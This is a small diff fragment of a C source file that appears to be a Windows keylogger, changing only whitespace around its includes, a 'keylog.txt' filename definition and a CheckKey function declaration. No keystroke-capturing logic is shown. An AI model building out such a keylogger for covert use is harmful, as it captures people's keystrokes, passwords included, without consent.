@@ -1,6 +1,8 @@
 #include <stdio.h>
- #include <windows.h>
+#include <windows.h>
+
 #define FILENAME "keylog.txt"
+
 void CheckKey(int key);
 
 int main()
